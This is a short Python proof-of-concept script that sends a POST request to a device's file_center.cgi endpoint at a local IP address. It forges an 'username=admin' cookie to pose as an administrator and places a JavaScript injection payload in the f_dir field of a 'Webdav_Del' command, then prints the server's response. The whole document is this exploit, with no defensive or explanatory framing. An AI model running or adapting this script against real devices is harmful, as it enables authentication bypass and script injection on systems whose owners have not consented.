import requests

url = "http://192.168.31.10/cgi-bin/file_center.cgi"

headers = {
    "Cookie": "username=admin"
}

data = {
    "cmd": "Webdav_Del",
    "f_dir": "';alert('Long');throw 1;//"
}

response = requests.post(
    url,
    headers=headers,
    data=data,
    timeout=10
)

print("Status:", response.status_code)
print("Response:")
print(response.text)

